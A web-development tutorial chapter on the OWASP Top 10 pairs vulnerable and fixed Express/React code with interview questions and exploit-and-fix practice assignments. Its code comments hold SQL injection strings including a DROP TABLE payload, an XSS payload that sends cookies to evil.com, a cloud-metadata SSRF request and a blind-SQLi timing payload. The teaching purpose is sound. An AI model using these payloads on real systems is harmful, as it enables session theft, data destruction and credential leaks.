@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OWASP Top 10 — Observability & Security — Senior Dev Notes</title>
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+</head>
+<body>
+<div class="app-shell">
+  <aside class="sidebar">
+    <div class="sidebar-brand"><button id="menu-toggle" class="icon-btn menu-toggle">☰</button><a href="../index.html">📘 Senior Dev Notes</a></div>
+    <input id="global-search" class="sidebar-search" type="text" placeholder="Search chapters...">
+    <ul id="search-results" style="list-style:none;padding:0;margin:0 0 10px;display:none;"></ul>
+    <nav id="sidebar-nav"></nav>
+  </aside>
+  <main class="main">
+    <div class="topbar">
+      <div class="breadcrumb"><a href="../index.html">Home</a><span class="sep">›</span><a href="index.html">Observability &amp; Security</a><span class="sep">›</span>OWASP Top 10</div>
+      <div class="topbar-actions">
+        <label class="done-toggle"><input type="checkbox" id="done-checkbox"> Mark done</label>
+        <button id="theme-toggle" class="icon-btn">🌙</button>
+      </div>
+    </div>
+    <div class="content">
+      <h1>OWASP Top 10</h1>
+      <p class="meta-line"><span>⏱ ~3 hrs</span><span>📍 Chapter 4 of 6</span></p>
+      <p><strong>One-line summary:</strong> The OWASP Top 10 (2021 edition, still current heading into 2026) is
+      the industry-standard list of the most critical web app security risks — a senior dev should be able to
+      produce a working exploit and a working fix for each of these against real Node/React code, not just recite
+      the names.</p>
+
+      <div class="toc"><h4>On this page</h4><ol id="toc-list"></ol></div>
+
+      <h2 id="why-it-matters">Why It Matters for a Senior Developer</h2>
+      <p>Security interview questions at the senior/lead level almost always reference OWASP — "how would you
+      prevent SQL injection in this code" or "spot the vulnerability in this snippet." Beyond interviews, as a
+      senior engineer you're the one reviewing PRs and setting the bar; if you can't recognize an injection
+      vulnerability or a broken access control pattern on sight, it ships. This chapter pairs every risk with a
+      real exploit payload and a real fix in Node/Express/React, because the gap between "knows the name" and
+      "can actually exploit and fix it" is exactly what separates a senior from someone who read a listicle.</p>
+
+      <h2 id="prerequisites">Prerequisites</h2>
+      <p>Comfortable with Express routing, SQL, and React rendering. Related: <a href="05-secure-auth-secrets.html">Secure Auth, Secrets, CORS/CSP/XSS/CSRF</a>.</p>
+
+      <h2 id="core-concepts">Core Concepts</h2>
+
+      <h3 id="a01-access-control">A01: Broken Access Control</h3>
+      <p>The single most common real-world vulnerability (moved to #1 in the 2021 revision). This covers IDOR
+      (Insecure Direct Object Reference — changing an ID in a URL to access another user's resource), missing
+      function-level authorization (an admin-only endpoint reachable by any authenticated user because the check
+      only happened in the UI), and privilege escalation via parameter tampering.</p>
+
+      <h3 id="a02-crypto-failures">A02: Cryptographic Failures</h3>
+      <p>Storing passwords with weak/no hashing (MD5, SHA1, or plaintext), using outdated TLS versions, hardcoding
+      encryption keys, or transmitting sensitive data over HTTP. Also covers predictable tokens (session IDs or
+      password reset tokens generated from <code>Math.random()</code> instead of a cryptographically secure
+      source).</p>
+
+      <h3 id="a03-injection">A03: Injection</h3>
+      <p>SQL injection, NoSQL injection, command injection, and XSS (technically its own category historically,
+      folded into Injection in 2021) all share the same root cause: untrusted input is concatenated into a
+      command/query/markup instead of being treated strictly as data.</p>
+
+      <h3 id="a04-insecure-design">A04: Insecure Design</h3>
+      <p>A flaw in the system's design itself, not an implementation bug — e.g., a password reset flow that
+      reveals whether an email exists in the system (enumeration), or a business logic flaw like a checkout flow
+      that doesn't re-validate price server-side after a client-supplied discount is applied.</p>
+
+      <h3 id="a05-misconfiguration">A05: Security Misconfiguration</h3>
+      <p>Default credentials left enabled, verbose error messages leaking stack traces/DB schema to the client,
+      unnecessary features/ports/services enabled, missing security headers (CSP, HSTS, X-Frame-Options), and
+      permissive CORS (<code>Access-Control-Allow-Origin: *</code> combined with credentials).</p>
+
+      <h3 id="a06-vulnerable-components">A06: Vulnerable and Outdated Components</h3>
+      <p>Using a dependency with a known CVE (e.g., an old lodash prototype-pollution bug, a vulnerable version of
+      a JWT library that accepts <code>alg: none</code>). This is why <code>npm audit</code>/Dependabot/Snyk and
+      a disciplined patching cadence are a senior-level responsibility, not optional hygiene.</p>
+
+      <h3 id="a07-auth-failures">A07: Identification and Authentication Failures</h3>
+      <p>Weak password policies, no rate limiting on login (allowing brute force/credential stuffing), session
+      fixation, exposing session IDs in URLs, and not invalidating sessions on logout/password change.</p>
+
+      <h3 id="a08-integrity-failures">A08: Software and Data Integrity Failures</h3>
+      <p>Trusting data/code from an untrusted source without verifying integrity — e.g., deserializing untrusted
+      data (insecure deserialization), loading a CDN script without Subresource Integrity (SRI), or an
+      auto-update mechanism that doesn't verify a signature before applying an update.</p>
+
+      <h3 id="a09-logging-failures">A09: Security Logging and Monitoring Failures</h3>
+      <p>Not logging authentication failures, access control failures, or input validation failures means a
+      breach can go undetected for months — this ties directly into the <a href="01-logging.html">Logging</a> and
+      <a href="06-incident-handling.html">Incident Handling</a> chapters. Logging too much sensitive data is the
+      opposite failure and equally dangerous.</p>
+
+      <h3 id="a10-ssrf">A10: Server-Side Request Forgery (SSRF)</h3>
+      <p>An attacker tricks the server into making a request to an unintended destination — classically, a
+      "fetch this image URL" feature that accepts <code>http://169.254.169.254/latest/meta-data/</code> (the AWS
+      instance metadata endpoint) and leaks cloud credentials, because the server-side fetch has network access
+      the attacker doesn't.</p>
+
+      <h2 id="under-the-hood">How It Works Under the Hood</h2>
+      <p>Nearly every injection-class vulnerability reduces to the same mechanism: a parser (SQL engine, shell,
+      HTML renderer, template engine) is given a single string that mixes trusted structure (the query/command
+      template) with untrusted data (user input), and the parser can't distinguish where structure ends and data
+      begins once they're concatenated. The fix pattern is always the same shape too: keep structure and data on
+      separate channels so the parser receives them distinctly — parameterized queries (SQL sends the query
+      template and the parameter values separately over the wire protocol, never concatenated), React's JSX
+      auto-escaping (text content is escaped before insertion into the DOM, distinguishing "this is data to
+      display" from "this is markup to render"), and <code>execFile</code> with an argument array instead of
+      <code>exec</code> with a shell string (arguments are passed as a vector, never shell-interpreted as one
+      blob). Understanding this one unifying mechanism is more valuable in an interview than memorizing ten
+      separate categories.</p>
+
+      <h2 id="diagrams">Diagrams</h2>
+      <div class="mermaid">
+graph TD
+  A[Untrusted input] -->|concatenated into query/command/markup string| B[Parser cannot distinguish structure from data]
+  B --> C[Injection: SQLi, command injection, XSS]
+  A -->|sent as separate parameter/value, never concatenated| D[Parser receives structure and data on separate channels]
+  D --> E[Safe: parameterized query, escaped render, argv array]
+      </div>
+
+      <h2 id="code-examples">Code Examples</h2>
+      <pre><code class="language-typescript">// =========================================================================
+// A03 — SQL INJECTION: vulnerable vs fixed
+// =========================================================================
+// VULNERABLE — string concatenation builds the query from user input.
+app.get("/users/search-bad", async (req, res) => {
+  const { name } = req.query;
+  // Exploit payload: ?name=' OR '1'='1
+  // Resulting query: SELECT * FROM users WHERE name = '' OR '1'='1'
+  // Returns EVERY user, not just matches — classic auth-bypass-via-search.
+  // A worse payload: ?name=x'; DROP TABLE users; --
+  const result = await db.query(`SELECT * FROM users WHERE name = '${name}'`);
+  res.json(result.rows);
+});
+
+// FIXED — parameterized query. The driver sends the SQL template and the
+// value separately over the wire; the DB engine NEVER treats $1 as part
+// of the SQL grammar, no matter what string is substituted at runtime.
+app.get("/users/search-good", async (req, res) => {
+  const { name } = req.query;
+  const result = await db.query("SELECT * FROM users WHERE name = $1", [name]);
+  res.json(result.rows);
+});
+
+// =========================================================================
+// A03 — REFLECTED XSS: vulnerable vs fixed (React)
+// =========================================================================
+// VULNERABLE — dangerouslySetInnerHTML with unsanitized user input.
+// Exploit payload (e.g., a URL query param reflected into the page):
+//   ?comment=<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
+function CommentBad({ comment }: { comment: string }) {
+  return <div dangerouslySetInnerHTML={{ __html: comment }} />;
+  // The onerror handler executes in the victim's browser with the victim's
+  // session, exfiltrating their cookie to an attacker-controlled server.
+}
+
+// FIXED — React escapes text content by default when rendered as a child,
+// never as raw HTML. If you truly need to render limited rich text, run
+// it through a sanitizer (DOMPurify) that strips event handlers/script tags.
+function CommentGood({ comment }: { comment: string }) {
+  return <div>{comment}</div>; // React escapes this automatically
+}
+// If rich text is a real requirement:
+import DOMPurify from "dompurify";
+function CommentRichText({ html }: { html: string }) {
+  const clean = DOMPurify.sanitize(html, { ALLOWED_TAGS: ["b", "i", "a"] });
+  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
+}
+
+// =========================================================================
+// A01 — BROKEN ACCESS CONTROL (IDOR): vulnerable vs fixed
+// =========================================================================
+// VULNERABLE — fetches the invoice by ID with no ownership check.
+// Exploit: an authenticated user simply increments the ID in the URL —
+// GET /invoices/1042 -> GET /invoices/1043 -> sees another customer's invoice.
+app.get("/invoices/:id", requireAuth, async (req, res) => {
+  const invoice = await db.query("SELECT * FROM invoices WHERE id = $1", [req.params.id]);
+  res.json(invoice.rows[0]);
+});
+
+// FIXED — scope the query to the authenticated user, not just the resource ID.
+app.get("/invoices/:id", requireAuth, async (req, res) => {
+  const invoice = await db.query(
+    "SELECT * FROM invoices WHERE id = $1 AND user_id = $2",
+    [req.params.id, req.user.id]
+  );
+  if (invoice.rows.length === 0) return res.status(404).json({ error: "not found" });
+  res.json(invoice.rows[0]);
+});
+
+// =========================================================================
+// A10 — SSRF: vulnerable vs fixed
+// =========================================================================
+// VULNERABLE — fetches whatever URL the client supplies, with full server
+// network access, including internal/cloud-metadata endpoints.
+// Exploit: POST /fetch-avatar { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
+app.post("/fetch-avatar-bad", async (req, res) => {
+  const resp = await fetch(req.body.url);
+  res.send(await resp.text());
+});
+
+// FIXED — allowlist destinations and block private/link-local IP ranges;
+// never let the server make an outbound request to an attacker-chosen URL.
+import { isIP } from "node:net";
+import dns from "node:dns/promises";
+
+const ALLOWED_HOSTS = new Set(["images.trusted-cdn.com"]);
+function isPrivateOrLinkLocal(ip: string): boolean {
+  return /^(10\.|127\.|169\.254\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip);
+}
+
+app.post("/fetch-avatar-good", async (req, res) => {
+  const url = new URL(req.body.url);
+  if (!ALLOWED_HOSTS.has(url.hostname)) {
+    return res.status(400).json({ error: "host not allowed" });
+  }
+  const { address } = await dns.lookup(url.hostname);
+  if (isIP(address) && isPrivateOrLinkLocal(address)) {
+    return res.status(400).json({ error: "resolved to a blocked internal address" });
+  }
+  const resp = await fetch(url.toString(), { redirect: "error" }); // block redirect-based bypass
+  res.send(await resp.text());
+});
+
+// =========================================================================
+// A06 — VULNERABLE COMPONENTS: detect in CI
+// =========================================================================
+/* package.json script, run in CI, fails the build on known-vulnerable deps:
+  "scripts": { "audit:ci": "npm audit --audit-level=high" }
+*/
+</code></pre>
+
+      <h2 id="production-scenario">Real-World Production Scenario at Scale</h2>
+      <div class="box prod">
+        <h4>At scale</h4>
+        <p>A SaaS company's support ticket search endpoint built its query via string concatenation
+        (<code>WHERE subject LIKE '%${q}%'</code>) and had been in production for 18 months. A security researcher
+        found it via a bug bounty program using a time-based blind SQLi payload
+        (<code>' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)--</code>) — no error was ever returned,
+        but the response time difference confirmed the injection was exploitable, and from there the researcher
+        extracted the entire customer database including hashed passwords and billing details. Because A09
+        (logging failures) was also present — the query string wasn't logged, and there was no WAF — the company
+        couldn't determine how far back the exploitation had actually started, forcing a worst-case assumption
+        (full historical breach) for their disclosure and forced a mass credential reset for every customer. The
+        fix was a single-line change to a parameterized query; the actual cost was months of incident response,
+        legal review, and reputational damage — a stark illustration of why "ship it, we'll harden it later"
+        on injection-class bugs is never acceptable.</p>
+      </div>
+
+      <h2 id="mistakes">Common Mistakes, Gotchas and Best Practices</h2>
+      <div class="box gotcha">
+        <h4>Gotcha</h4>
+        <p>"We use an ORM, so we're safe from SQL injection" is false — most ORMs (Prisma, Sequelize, TypeORM)
+        still have raw-query escape hatches (<code>$queryRawUnsafe</code>, <code>sequelize.query</code> with
+        string interpolation) that are just as vulnerable if a developer reaches for them under deadline pressure
+        without realizing the ORM's safety guarantee doesn't extend there.</p>
+      </div>
+      <ul>
+        <li>Validate/authorize at every layer that matters (UI hiding a button is not access control — the
+        server must independently enforce it).</li>
+        <li>Treat every client-supplied value — query params, body, headers, cookies, even values from your own
+        previous API response if a client could tamper with it in transit — as untrusted.</li>
+        <li>Run <code>npm audit</code> / Snyk / Dependabot in CI, not as a manual occasional task.</li>
+        <li>Set security headers by default (helmet.js in Express) rather than remembering each one individually.</li>
+        <li>Never build your own crypto/hashing — use established libraries (bcrypt/argon2 for passwords, a vetted JWT library with explicit algorithm allowlisting).</li>
+      </ul>
+
+      <h2 id="tradeoffs">Tradeoffs</h2>
+      <table>
+        <tr><th>Approach</th><th>Use when</th><th>Avoid when</th><th>Alternative</th></tr>
+        <tr><td>Parameterized queries</td><td>Always, for any dynamic SQL</td><td>Never — there's no valid reason to avoid this</td><td>N/A</td></tr>
+        <tr><td>Allowlist validation</td><td>Input has a known, bounded set of valid values</td><td>Truly free-form input (names, comments)</td><td>Denylist + strict escaping/sanitization (weaker, last resort)</td></tr>
+        <tr><td>DOMPurify for rich text</td><td>Genuinely need user-supplied HTML (CMS, rich comments)</td><td>Plain text is sufficient</td><td>Render as escaped plain text (React default)</td></tr>
+        <tr><td>WAF (Web Application Firewall)</td><td>Defense-in-depth layer, catching known attack patterns</td><td>As a substitute for fixing the actual code vulnerability</td><td>Fix the root cause in application code</td></tr>
+      </table>
+
+      <h2 id="interview-questions">Interview Questions</h2>
+      <div class="qa-level basic">
+        <h4>Basic</h4>
+        <details class="qa"><summary>What is SQL injection and how do parameterized queries prevent it?</summary><div class="answer"><p>Untrusted input is concatenated into a SQL string, letting an attacker change the query's structure. Parameterized queries send the query template and values separately to the DB engine, so the value is always treated as data, never as SQL grammar.</p></div><div class="followup">Follow-up: does using an ORM automatically protect you?</div></details>
+        <details class="qa"><summary>What is reflected vs stored XSS?</summary><div class="answer"><p>Reflected XSS: the malicious script comes from the current request (e.g., a URL parameter) and is immediately reflected back into the response. Stored XSS: the malicious script is saved (e.g., in a comment/database) and served to other users later, affecting everyone who views that content.</p></div><div class="followup">Follow-up: which is generally more dangerous and why?</div></details>
+        <details class="qa"><summary>What is an IDOR vulnerability?</summary><div class="answer"><p>Insecure Direct Object Reference — accessing another user's resource by directly manipulating an identifier (e.g., an ID in a URL) because the server doesn't verify the requester owns that resource.</p></div><div class="followup">Follow-up: how do you fix it at the query level?</div></details>
+        <details class="qa"><summary>What is SSRF?</summary><div class="answer"><p>Server-Side Request Forgery — tricking a server into making an HTTP request to an attacker-chosen destination, often to reach internal-only resources the attacker couldn't reach directly (e.g., cloud metadata endpoints).</p></div><div class="followup">Follow-up: why is blocking by hostname string alone insufficient?</div></details>
+        <details class="qa"><summary>Why does OWASP rank Broken Access Control as the #1 risk?</summary><div class="answer"><p>It's the most common real-world vulnerability found in actual breach data — it's easy to introduce (forgetting a single ownership check) and often not caught by automated scanners the way injection sometimes is.</p></div><div class="followup">Follow-up: why do automated scanners struggle to detect broken access control?</div></details>
+        <details class="qa"><summary>What's wrong with relying only on client-side (UI) authorization checks?</summary><div class="answer"><p>A client is fully controlled by the attacker — any check that only exists in JS/UI can be bypassed by calling the API directly. The server must independently enforce every authorization rule.</p></div><div class="followup">Follow-up: give an example of a UI-only check that's commonly mistaken for real security.</div></details>
+      </div>
+      <div class="qa-level medium">
+        <h4>Medium</h4>
+        <details class="qa"><summary>Walk through a time-based blind SQL injection attack and why it's harder to detect than error-based injection.</summary><div class="answer"><p>The attacker injects a conditional expression that causes a deliberate delay (e.g., pg_sleep) only if some condition about the data is true, and infers the answer from response timing rather than any visible error or data difference — there's no error message or obviously wrong output to flag it, making it invisible to basic error-monitoring and requiring either WAF pattern detection or careful query logging to catch.</p></div><div class="followup">Follow-up: how would you design logging/monitoring to catch this pattern?</div></details>
+        <details class="qa"><summary>Explain why "we use React, so we're immune to XSS" is a dangerous misconception.</summary><div class="answer"><p>React auto-escapes content rendered as normal JSX children, but <code>dangerouslySetInnerHTML</code>, directly setting <code>href</code> to a <code>javascript:</code> URL, or rendering unsanitized SVG/markdown can all reintroduce XSS; React protects the common case, not every case, and developers reaching for an escape hatch under time pressure is common.</p></div><div class="followup">Follow-up: how would you prevent a javascript: URL XSS in an href attribute?</div></details>
+        <details class="qa"><summary>How would you design code review practices to systematically catch A01 (broken access control) issues before merge?</summary><div class="answer"><p>Require every resource-fetching endpoint to show an explicit ownership/role check in the diff (not just existence of auth middleware, which only proves authentication, not authorization); maintain a checklist item in PR templates; write automated tests that attempt cross-tenant access for every new resource endpoint and fail CI if it succeeds.</p></div><div class="followup">Follow-up: how do you test for this automatically rather than relying purely on manual review?</div></details>
+        <details class="qa"><summary>Why does the 2021 OWASP revision fold XSS into "Injection" instead of keeping it separate?</summary><div class="answer"><p>Both share the same root cause — untrusted data mixed with trusted structure (SQL grammar or HTML markup) without separation — so categorizing by mechanism rather than by output format (DB vs browser) better reflects the actual defense pattern (always separate data from structure) regardless of where the parser lives.</p></div><div class="followup">Follow-up: does this recategorization change how you'd defend against it in practice?</div></details>
+        <details class="qa"><summary>How would an attacker exploit insecure deserialization (A08), and how do you defend against it in a Node app?</summary><div class="answer"><p>If an app deserializes untrusted data into objects/functions without validation (e.g., using <code>eval</code>-based parsers, or a library that reconstructs class instances from JSON), an attacker can craft a payload that executes arbitrary code or triggers unintended side effects on deserialization. Defend by using safe parsers (plain <code>JSON.parse</code>, never <code>eval</code>), validating the shape/schema of deserialized data (zod/io-ts) before trusting it, and avoiding libraries that support arbitrary type reconstruction from untrusted input.</p></div><div class="followup">Follow-up: why is JSON.parse generally safe while eval-based parsing is not?</div></details>
+      </div>
+      <div class="qa-level advanced">
+        <h4>Advanced</h4>
+        <details class="qa"><summary>Design a defense-in-depth strategy against SSRF for a feature that must fetch arbitrary user-supplied URLs (e.g., a link-preview generator).</summary><div class="answer"><p>Layer multiple independent controls: resolve DNS and re-validate the resolved IP isn't private/link-local/loopback (not just the hostname, since DNS can be manipulated by an attacker — DNS rebinding); disable HTTP redirects or re-validate on every redirect hop; run the fetch from a network-isolated egress point with no access to internal services/cloud metadata (separate VPC/subnet with strict egress rules); set a short timeout and response size cap; and treat the fetched content itself as untrusted when rendering a preview (don't execute scripts from fetched HTML).</p></div><div class="followup">Follow-up: what's DNS rebinding and why does validating the IP once at request time insufficiently protect against it?</div></details>
+        <details class="qa"><summary>You inherit a codebase where every table has row-level "tenant_id" scoping done manually in each query. How would you redesign this to eliminate an entire class of A01 bugs structurally?</summary><div class="answer"><p>Move tenant scoping out of individual query authors' hands and into a structural guarantee — e.g., Postgres Row-Level Security policies that enforce tenant_id filtering at the database level regardless of the application query, or a query-building layer/ORM middleware that automatically injects the tenant filter on every query so a developer physically cannot write a query that omits it. This converts "remember to add the check" (a human reliability problem) into "the check is structurally unavoidable" (a correctness-by-construction solution).</p></div><div class="followup">Follow-up: what's the performance/operational cost of Postgres RLS at scale?</div></details>
+        <details class="qa"><summary>How would you build an automated security regression test suite that catches OWASP Top 10 issues in CI before they reach production?</summary><div class="answer"><p>Combine SAST (static analysis like Semgrep/CodeQL with rules for string-concatenated queries, dangerouslySetInnerHTML with non-sanitized input, missing auth middleware), dependency scanning (npm audit/Snyk) gating merges on high-severity CVEs, DAST (an automated scanner like OWASP ZAP run against a staging deploy) for runtime issues like misconfigured headers, and targeted integration tests that attempt known exploit payloads (IDOR cross-tenant fetch, SQLi payloads) against every new endpoint as a required CI gate, not optional.</p></div><div class="followup">Follow-up: what's the main limitation of SAST tools (false positive/negative rates) and how do you manage that operationally?</div></details>
+        <details class="qa"><summary>Explain how a supply-chain attack (A06/A08 overlap) could compromise your build pipeline even if your own application code has zero vulnerabilities.</summary><div class="answer"><p>A compromised transitive dependency (or a compromised maintainer account publishing a malicious version, as happened in real npm incidents) can execute arbitrary code at install time (a malicious postinstall script) or inject malicious code into the bundled output, affecting every consumer regardless of their own code quality. Defenses: lockfiles with integrity hashes, disabling scripts on install by default in CI (<code>npm ci --ignore-scripts</code> where feasible), pinning and auditing dependency updates rather than auto-upgrading blindly, and SBOM (Software Bill of Materials) generation to know exactly what's in a given build.</p></div><div class="followup">Follow-up: why does a lockfile alone not fully protect you against a compromised package version you've already pinned to?</div></details>
+        <details class="qa"><summary>How do you balance shipping velocity against security rigor when a startup is pre-PMF and a mature OWASP-compliant process would slow every PR down significantly?</summary><div class="answer"><p>Triage by actual risk and blast radius rather than applying uniform rigor everywhere — enforce the cheap, high-leverage, zero-velocity-cost controls unconditionally (parameterized queries, helmet.js headers, dependency scanning in CI, basic auth checks) since these cost almost nothing to do right from day one, while deferring heavier processes (formal pen testing, SAST rule tuning, extensive threat modeling) until the product and its actual attack surface/data sensitivity justify the investment — the mistake is treating "move fast" as license to skip the free wins, not the expensive ones.</p></div><div class="followup">Follow-up: what signal would tell you it's time to invest in the heavier security processes?</div></details>
+      </div>
+
+      <h2 id="assignments">Practice Assignments</h2>
+      <div class="assignment">
+        <span class="level-tag">Beginner (30-60 min)</span>
+        <h4>Exploit and fix a SQL injection</h4>
+        <p>Build a tiny Express + SQLite/Postgres app with a <code>/search?name=</code> endpoint built via string
+        concatenation. Write a curl command that exploits it (returns all rows, or extracts data it shouldn't),
+        then fix it with a parameterized query and prove the same payload no longer works.</p>
+        <ul>
+          <li>Document the exact exploit payload used and what it returned.</li>
+          <li>Fix with a parameterized query.</li>
+          <li>Re-run the exact same payload against the fixed version and show it now returns zero/expected results.</li>
+        </ul>
+        <p><strong>Acceptance criteria:</strong> A before/after curl transcript showing the exploit succeeding then failing.</p>
+        <details class="qa"><summary>Hints</summary><div class="answer"><p>Try <code>' OR '1'='1</code> first; it's the simplest payload that proves the vulnerability exists.</p></div></details>
+        <p><strong>Bonus:</strong> Try a second payload that attempts a UNION-based data extraction from a different table.</p>
+      </div>
+      <div class="assignment">
+        <span class="level-tag">Intermediate (2-4 hrs)</span>
+        <h4>Build and fix an IDOR + stored XSS pair</h4>
+        <p>Build a small "notes" app: users can create notes (stored, rendered via dangerouslySetInnerHTML on
+        purpose) and fetch a note by ID with no ownership check. Exploit both: inject a script tag that
+        exfiltrates something observable (e.g., writes to a global variable you can inspect), and access another
+        user's note by ID manipulation. Fix both.</p>
+        <ul>
+          <li>XSS payload actually executes in a browser context during the vulnerable phase.</li>
+          <li>IDOR: User B can fetch User A's private note by guessing/incrementing the ID.</li>
+          <li>Fixed version: XSS payload renders as literal text; IDOR returns 403/404 for cross-user access.</li>
+        </ul>
+        <p><strong>Acceptance criteria:</strong> Screenshots or recorded output proving exploit success before the fix and failure after.</p>
+        <details class="qa"><summary>Hints</summary><div class="answer"><p>For XSS, something like <code>&lt;img src=x onerror="window.exploited=true"&gt;</code> is a safe, observable proof without needing a real exfiltration server.</p></div></details>
+        <p><strong>Bonus:</strong> Add DOMPurify and support a limited safe subset of rich text instead of plain-text-only.</p>
+      </div>
+      <div class="assignment">
+        <span class="level-tag">Advanced (1-2 days)</span>
+        <h4>Full vulnerable-app audit with 5+ fixed vulnerabilities and CI gating</h4>
+        <p>Take (or build) a small full-stack app and deliberately seed it with at least 5 OWASP Top 10
+        vulnerabilities across different categories (e.g., SQLi, stored XSS, IDOR, SSRF via an image-fetch
+        feature, and a hardcoded secret). Write exploit scripts for each, fix each, and add automated regression
+        tests (integration tests attempting each exploit) plus a CI step (npm audit, a Semgrep rule, or similar)
+        that would catch at least one category automatically in the future.</p>
+        <ul>
+          <li>For each of the 5 vulnerabilities: exploit script, fix, and a regression test that fails against the vulnerable version and passes against the fix.</li>
+          <li>At least one CI-level automated check (SAST rule or dependency audit) wired into a pipeline config.</li>
+          <li>Write a short security review report summarizing each finding, severity, and remediation — the format a real pen test report would use.</li>
+        </ul>
+        <details class="qa"><summary>Hints</summary><div class="answer"><p>This is intentionally open-ended — pick vulnerabilities that span multiple root-cause categories (not 5 flavors of injection) to demonstrate breadth.</p></div></details>
+        <p><strong>Bonus:</strong> Set up OWASP ZAP in a Docker container to run an automated DAST scan against your running app and compare its findings to the vulnerabilities you seeded.</p>
+      </div>
+
+      <h2 id="cheatsheet">Quick Revision Cheat Sheet</h2>
+      <div class="cheatsheet">
+        <ul>
+          <li>A01 Broken Access Control — #1 risk; always enforce ownership/role checks server-side, never trust UI-only checks.</li>
+          <li>A02 Cryptographic Failures — bcrypt/argon2 for passwords, never roll your own crypto, TLS everywhere.</li>
+          <li>A03 Injection (SQLi/XSS/command) — always separate data from structure: parameterized queries, auto-escaped rendering, argv-array process spawning.</li>
+          <li>A04 Insecure Design — re-validate business rules (price, discount) server-side, never trust client-computed values.</li>
+          <li>A05 Security Misconfiguration — set security headers (helmet.js), disable verbose errors in prod, lock down CORS.</li>
+          <li>A06 Vulnerable Components — npm audit / Snyk / Dependabot in CI, patch on a cadence.</li>
+          <li>A07 Auth Failures — rate-limit login, invalidate sessions on logout/password change, strong password/MFA policy.</li>
+          <li>A08 Integrity Failures — never eval/deserialize untrusted data, use SRI for third-party scripts.</li>
+          <li>A09 Logging Failures — log auth/access failures (without logging secrets); this is your only breach-detection signal.</li>
+          <li>A10 SSRF — allowlist destinations, re-validate resolved IPs (watch for DNS rebinding), block redirects to internal ranges.</li>
+        </ul>
+      </div>
+
+      <h2 id="further-reading">Further Reading</h2>
+      <ul>
+        <li><a href="https://owasp.org/Top10/">OWASP Top 10 (official)</a></li>
+        <li><a href="https://cheatsheetseries.owasp.org/">OWASP Cheat Sheet Series</a></li>
+        <li><a href="https://github.com/cure53/DOMPurify">DOMPurify</a></li>
+        <li><a href="https://www.zaproxy.org/">OWASP ZAP</a></li>
+      </ul>
+
+      <div class="chapter-nav">
+        <a class="prev" href="03-distributed-tracing.html"><span class="dir">← Previous</span>Distributed Tracing</a>
+        <a class="next" href="05-secure-auth-secrets.html"><span class="dir">Next →</span>Secure Auth, Secrets, CORS/CSP/XSS/CSRF</a>
+      </div>
+    </div>
+    <footer class="page-footer">Senior Dev Notes · Observability &amp; Security</footer>
+  </main>
+</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-typescript.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-yaml.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js"></script>
+<script type="module">
+  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';
+  window.mermaid = mermaid;
+</script>
+<script src="../assets/script.js"></script>
+<script>initPage({ rootPrefix: "../", topic: "07-observability-security", chapterKey: "04-owasp-top-10" });</script>
+</body>
+</html>
